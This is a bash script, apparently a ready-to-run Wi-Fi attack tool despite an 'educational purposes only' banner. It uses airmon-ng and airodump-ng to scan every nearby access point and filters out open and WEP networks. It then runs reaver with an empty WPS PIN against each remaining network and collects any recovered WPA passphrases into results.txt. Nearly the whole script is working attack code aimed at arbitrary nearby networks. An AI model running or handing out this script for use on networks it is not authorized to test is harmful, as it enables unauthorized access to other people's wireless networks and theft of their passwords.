clear
echo This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.
echo ONLY FOR LEGAL / AUTHORIZED / STUDY PURPOSES
read -p "Press enter to continue"
clear

echo This script will scan for APs, remove OPN/WEP from the list and try to use the "WPS NULL PIN" breach. Results are saved in results.txt
read -p "Press enter to continue"
clear

mon=$(iwconfig 2>&1 | grep Monitor | cut -d ' ' -f 1)

if [[ $mon == "" ]]; then
  iwconfig
  echo Input your wireless card
  read card
  cardmon=$(airmon-ng start $card | grep on -w | cut -d ' ' -f 9 | cut -d ] -f 2 | cut -d \) -f 1)
else 
  cardmon=$(echo $mon)
fi

echo For how long should I scan APs ? \(seconds\)
read scantime

echo Time to spend for each AP ? \(seconds, recommended is 20 or less\)
read cracktime

clear

#xterm -e timeout $scantime airodump-ng $cardmon -w airodump
screen -dmS airodump airodump-ng $cardmon -w airodump
sleep $scantime
for pid in `pidof airodump-ng`;
do
  kill -9 $pid
done

rm airodump-01.cap
rm airodump-01.kismet.csv
rm airodump-01.kismet.netxml
grep WEP airodump-01.csv -v | grep OPN -v > filter.txt
rm airodump-01.csv
cut -d , -f 1 filter.txt > bssid.txt
cut -d , -f 4 filter.txt > channels.txt
rm filter.txt
sedbssid=$(grep -n Station bssid.txt | cut -d : -f 1)
sedbssid=$((sedbssid-2))
sed '3,'$sedbssid'!d' bssid.txt > bssid1.txt
sedchannel=$(grep -n Power channels.txt | cut -d : -f 1)
sedchannel=$((sedchannel-2))
sed '3,'$sedchannel'!d' channels.txt > channels1.txt
rm channels.txt
mv channels1.txt channels.txt
rm bssid.txt
mv bssid1.txt bssid.txt
nbrlignes=$(wc -l bssid.txt | cut -d ' ' -f 1)

for ligne in `seq 1 $nbrlignes`;
do
  echo $ligne out of $nbrlignes. Estimated remaining time : $((($cracktime*($nbrlignes-$ligne)/60)+1)) minutes
  bssid=$(head -$ligne bssid.txt | tail -1)
  channel=$(head -$ligne channels.txt | tail -1)
  timeout $cracktime sudo reaver -i $cardmon -b $bssid -p "" -vv -c $channel >> output.txt
done

grep -A1 "WPA PSK:" output.txt >> results.txt
rm output.txt
rm bssid.txt
rm channels.txt
cat results.txt

